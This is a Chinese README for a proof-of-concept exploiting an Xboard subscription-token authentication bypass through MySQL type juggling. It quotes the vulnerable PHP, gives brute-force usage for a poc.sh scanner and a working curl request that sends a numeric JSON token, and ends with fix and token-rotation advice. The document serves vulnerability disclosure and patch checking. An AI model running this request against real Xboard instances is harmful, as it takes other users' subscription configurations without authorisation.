# Xboard 订阅 token 认证绕过 PoC

> made by @pingzicloud1234

影响：`cedar2025/Xboard` 在提交 `e68fec5` 之前的版本。

## 原理

旧 `app/Http/Middleware/Client.php`：

```php
$token = $request->input('token', $request->route('token'));
if (empty($token)) { throw new ApiException('token is null', 403); }
$user = User::where('token', $token)->first();
```

`input()` 不校验类型。把 token 作为 JSON **数字**放 body，PHP 得到 `int`，
`users.token` 是 `CHAR(32)`，MySQL 会把列值转数字后比较：

```
'44155bc2...' = 44155   -> true
```

于是一个数字就能命中所有以该数字开头的 token，`first()` 返回任意一条，
无需完整 token 即可拿到该用户订阅。

## 必要条件

- body 必须是 JSON，且数字**不加引号**。
  query 里的 `?token=2` 是字符串，MySQL 走字符串比较，不会命中。
- 不能试 `token=0`：旧代码 `empty(0) === true`，直接 403。
- 命中值是 token 的**数字前缀**：`11xxxx` 要试 `11`，不是 `1`。

## 用法

```bash
./poc.sh -u https://example.com              # 试 1..99
./poc.sh -u https://example.com -n 999       # 扩大范围
./poc.sh -u https://example.com -f singbox   # 换订阅格式
./poc.sh -u https://example.com -k -v        # 忽略证书 / 显示失败请求
```

命中即 `VULNERABLE`，响应存 `./out/`（节点等实例配置只落在输出里，脚本本身通用、
不含任何实例信息）。

退出码：`0` 漏洞存在，`1` 未命中或已修复，`2` 参数错误。

## 手工验证

```bash
curl -s -o /dev/null -w '%{http_code}\n' -X GET 'https://example.com/api/v1/client/subscribe' \
  -H 'Content-Type: application/json' \
  --data-raw '{"token":2,"flag":"clashmeta"}'
```

200 且有配置 = 存在漏洞；403 = 已修复或未命中。

## 修复

- 升级到 `e68fec5` 或之后版本（该提交增加 `Helper::validateSubscriptionToken`，
  只接受 32 位 hex，并优先取 route token、只用 query）。
- 纯数字 token 在修复后应全部 403，正常 32 位 token 仍 200。
- token 可能已泄露，建议轮换。
